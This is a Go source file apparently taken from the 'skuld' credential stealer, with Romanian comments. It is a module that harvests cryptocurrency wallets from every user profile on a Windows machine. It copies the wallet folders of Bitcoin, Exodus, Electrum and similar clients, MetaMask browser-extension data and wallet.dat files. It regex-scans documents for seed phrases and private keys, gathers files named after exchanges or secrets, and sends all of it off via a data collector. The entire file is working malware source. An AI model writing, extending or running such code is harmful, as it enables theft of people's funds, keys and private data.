package wallets

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"regexp"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

// Run execută toate metodele de colectare wallet și trimite datele
func Run(dataCollector *collector.DataCollector) {
	// Director de bază pentru toate datele wallet
	baseDir := filepath.Join(os.TempDir(), "skuld-wallets")
	os.MkdirAll(baseDir, os.ModePerm)

	LocalWallets(dataCollector, baseDir)
	WalletExtensions(dataCollector, baseDir)
	WalletDatFiles(dataCollector, baseDir)
	CryptoFiles(dataCollector, baseDir)
	ExchangeFiles(dataCollector, baseDir)

	// Trimite toate datele colectate
	dataCollector.SendCollectedData()
}

// LocalWallets - Detectare locală portofele
func LocalWallets(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "local-wallets")
	os.MkdirAll(tempDir, os.ModePerm)

	walletPaths := map[string][]string{
		"Bitcoin": {"AppData\\Roaming\\Bitcoin", "AppData\\Local\\Bitcoin"},
		"Ethereum": {"AppData\\Roaming\\Ethereum", "AppData\\Local\\Ethereum"},
		"Exodus": {"AppData\\Roaming\\Exodus"},
		"Electrum": {"AppData\\Roaming\\Electrum"},
		"Litecoin": {"AppData\\Roaming\\Litecoin"},
		"Dogecoin": {"AppData\\Roaming\\DogeCoin"},
	}

	found := 0
	totalSize := int64(0)
	foundWallets := make(map[string]bool)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]

		for walletName, paths := range walletPaths {
			for _, path := range paths {
				fullPath := filepath.Join(user, path)

				if !fileutil.IsDir(fullPath) {
					continue
				}

				walletKey := fmt.Sprintf("%s_%s_%s", userName, walletName, path)
				if foundWallets[walletKey] {
					continue
				}
				foundWallets[walletKey] = true

				destPath := filepath.Join(tempDir, userName, walletName, filepath.Base(path))
				os.MkdirAll(destPath, os.ModePerm)

				if err := fileutil.CopyDir(fullPath, destPath); err != nil {
					fmt.Println("LocalWallets CopyDir error:", err)
					continue
				}

				if size, err := fileutil.GetDirectorySize(destPath); err == nil {
					totalSize += size
					found++
				}
			}
		}
	}

	if found > 0 {
		localWalletsInfo := map[string]interface{}{
			"LocalWalletsFound": found,
			"TotalSizeMB":       totalSize / (1024 * 1024),
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("local_wallets", localWalletsInfo)
		dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets")
	}
}

// WalletExtensions - Detectare extensii browser wallet
func WalletExtensions(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "wallet-extensions")
	os.MkdirAll(tempDir, os.ModePerm)

	extensions := map[string]string{
		"nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
	}

	found := 0
	totalSize := int64(0)
	foundExtensions := make(map[string]bool)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]

		browserPaths := []string{
			"AppData\\Local\\Google\\Chrome\\User Data",
			"AppData\\Local\\Microsoft\\Edge\\User Data",
		}

		for _, browserPath := range browserPaths {
			fullBrowserPath := filepath.Join(user, browserPath)
			if !fileutil.IsDir(fullBrowserPath) {
				continue
			}

			profiles, err := os.ReadDir(fullBrowserPath)
			if err != nil {
				continue
			}

			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}

				extensionSettingsPath := filepath.Join(fullBrowserPath, profile.Name(), "Local Extension Settings")
				if !fileutil.IsDir(extensionSettingsPath) {
					continue
				}

				for extensionID, walletName := range extensions {
					extensionPath := filepath.Join(extensionSettingsPath, extensionID)
					if !fileutil.IsDir(extensionPath) {
						continue
					}

					extKey := fmt.Sprintf("%s_%s_%s_%s", userName, walletName, extensionID, profile.Name())
					if foundExtensions[extKey] {
						continue
					}
					foundExtensions[extKey] = true

					browserName := strings.Replace(browserPath, "\\", "_", -1)
					destPath := filepath.Join(tempDir, userName, browserName, profile.Name(), walletName+"_"+extensionID)
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					if err := fileutil.CopyDir(extensionPath, destPath); err != nil {
						fmt.Println("WalletExtensions CopyDir error:", err)
						continue
					}

					if size, err := fileutil.GetDirectorySize(destPath); err == nil {
						totalSize += size
						found++
					}
				}
			}
		}
	}

	if found > 0 {
		extensionsInfo := map[string]interface{}{
			"WalletExtensionsFound": found,
			"TotalSizeMB":           totalSize / (1024 * 1024),
			"TreeView":              fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_extensions", extensionsInfo)
		dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions")
	}
}

// WalletDatFiles - Cautare wallet.dat
func WalletDatFiles(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "wallet-dat")
	os.MkdirAll(tempDir, os.ModePerm)

	searchPaths := []string{
		"AppData\\Roaming\\Bitcoin",
		"AppData\\Roaming\\Litecoin",
		"Desktop",
		"Documents",
	}

	found := 0
	totalSize := int64(0)
	foundFiles := make(map[string]bool)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]

		for _, searchPath := range searchPaths {
			fullPath := filepath.Join(user, searchPath)
			if !fileutil.IsDir(fullPath) {
				continue
			}

			filepath.Walk(fullPath, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				if info.Size() > 100*1024*1024 {
					return nil
				}

				fileName := strings.ToLower(info.Name())
				if !strings.Contains(fileName, "wallet") && !strings.HasSuffix(fileName, ".dat") {
					return nil
				}

				fileKey := fmt.Sprintf("%s_%s_%d", path, userName, info.Size())
				if foundFiles[fileKey] {
					return nil
				}
				foundFiles[fileKey] = true

				relPath, _ := filepath.Rel(user, path)
				destPath := filepath.Join(tempDir, userName, "WalletDat", relPath)
				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

				if err := fileutil.CopyFile(path, destPath); err != nil {
					fmt.Println("WalletDatFiles CopyFile error:", err)
					return nil
				}

				totalSize += info.Size()
				found++
				return nil
			})
		}
	}

	if found > 0 {
		walletDatInfo := map[string]interface{}{
			"WalletDatFound": found,
			"TotalSizeMB":    totalSize / (1024 * 1024),
			"TreeView":       fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_dat", walletDatInfo)
		dataCollector.AddDirectory("wallet_dat", tempDir, "wallet_dat")
	}
}

// CryptoFiles - Detectare crypto în fișiere text
func CryptoFiles(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "crypto-files")
	os.MkdirAll(tempDir, os.ModePerm)

	patterns := map[string]*regexp.Regexp{
		"mnemonic_12":          regexp.MustCompile(`(?i)\b([a-z]+\s+){11}[a-z]+\b`),
		"mnemonic_24":          regexp.MustCompile(`(?i)\b([a-z]+\s+){23}[a-z]+\b`),
		"ethereum_private_key": regexp.MustCompile(`0x[a-fA-F0-9]{64}`),
		"bitcoin_address_1":    regexp.MustCompile(`1[a-km-zA-HJ-NP-Z1-9]{25,34}`),
	}

	found := 0
	suspiciousFiles := make(map[string][]string)
	cryptoData := make(map[string]string)
	foundFiles := make(map[string]bool)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]

		searchDirs := []string{
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() || info.Size() > 10*1024*1024 {
					return nil
				}

				ext := strings.ToLower(filepath.Ext(info.Name()))
				textExts := []string{".txt", ".json", ".dat", ".key", ".wallet"}
				isTextFile := false
				for _, e := range textExts {
					if ext == e {
						isTextFile = true
						break
					}
				}
				if !isTextFile {
					return nil
				}

				fileKey := fmt.Sprintf("%s_%s_%d", path, userName, info.Size())
				if foundFiles[fileKey] {
					return nil
				}

				content, err := fileutil.ReadFile(path)
				if err != nil {
					return nil
				}

				matches := []string{}
				for patternName, pattern := range patterns {
					if pattern.MatchString(content) {
						matches = append(matches, patternName)
						foundMatches := pattern.FindAllString(content, -1)
						for _, match := range foundMatches {
							cryptoData[fmt.Sprintf("%s_%s", patternName, info.Name())] = match
						}
					}
				}

				if len(matches) > 0 {
					foundFiles[fileKey] = true
					relPath, _ := filepath.Rel(user, path)
					destPath := filepath.Join(tempDir, userName, "CryptoFiles", relPath)
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					fileutil.CopyFile(path, destPath)
					suspiciousFiles[info.Name()] = matches
					found++
				}

				return nil
			})
		}
	}

	analysisPath := filepath.Join(tempDir, "CRYPTO_ANALYSIS.txt")
	analysisContent := fmt.Sprintf("Total suspicious files found: %d\n\n", found)
	for fileName, matches := range suspiciousFiles {
		analysisContent += fmt.Sprintf("File: %s\nMatches: %s\n---\n", fileName, strings.Join(matches, ", "))
	}
	fileutil.WriteFile(analysisPath, analysisContent)

	cryptoFilesInfo := map[string]interface{}{
		"CryptoFilesFound": found,
		"SuspiciousFiles":  suspiciousFiles,
		"CryptoDataFound":  cryptoData,
		"TreeView":         fileutil.Tree(tempDir, ""),
	}
	dataCollector.AddData("crypto_files", cryptoFilesInfo)
	dataCollector.AddDirectory("crypto_files", tempDir, "crypto_files")
}

// ExchangeFiles - Detectare fișiere exchange
func ExchangeFiles(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "exchange-files")
	os.MkdirAll(tempDir, os.ModePerm)

	exchangeKeywords := []string{"binance", "coinbase", "kraken", "api", "key", "secret", "backup", "mnemonic"}

	found := 0
	totalSize := int64(0)
	foundFiles := make(map[string]bool)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]

		searchDirs := []string{
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() || info.Size() > 50*1024*1024 {
					return nil
				}

				fileName := strings.ToLower(info.Name())
				isExchangeFile := false
				for _, keyword := range exchangeKeywords {
					if strings.Contains(fileName, keyword) {
						isExchangeFile = true
						break
					}
				}
				if !isExchangeFile {
					return nil
				}

				fileKey := fmt.Sprintf("%s_%s_%d", path, userName, info.Size())
				if foundFiles[fileKey] {
					return nil
				}
				foundFiles[fileKey] = true

				relPath, _ := filepath.Rel(user, path)
				destPath := filepath.Join(tempDir, userName, "ExchangeFiles", relPath)
				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
				fileutil.CopyFile(path, destPath)
				totalSize += info.Size()
				found++
				return nil
			})
		}
	}

	exchangeInfo := map[string]interface{}{
		"ExchangeFilesFound": found,
		"TotalSizeMB":        totalSize / (1024 * 1024),
		"TreeView":           fileutil.Tree(tempDir, ""),
	}
	dataCollector.AddData("exchange_files", exchangeInfo)
	dataCollector.AddDirectory("exchange_files", tempDir, "exchange_files")
}
